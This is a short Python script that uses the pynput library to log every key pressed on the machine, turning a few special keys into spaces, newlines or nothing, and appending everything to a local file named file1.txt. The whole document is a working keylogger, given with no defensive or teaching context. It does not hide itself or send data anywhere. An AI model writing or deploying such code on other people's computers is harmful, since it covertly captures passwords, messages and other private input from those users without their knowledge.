from pynput.keyboard import Listener

    
def listen(keyword):
    key = str(keyword)
    key =  key.replace("'","")
    if key == "Key.space":
        key = ' '
    if key == "Key.shiftKey.shift":
        key = ""
    if key == "Key.shift_r":
        key = ''
    if key == "Key.ctrl_l":
        key = ""
    if key == "Key.shift":
        key = ''
    if key == "Key.enter":
        key = "\n"
    with open("file1.txt","a") as f:
         f.write(key)
    
with Listener(on_press=listen) as l:
    l.join()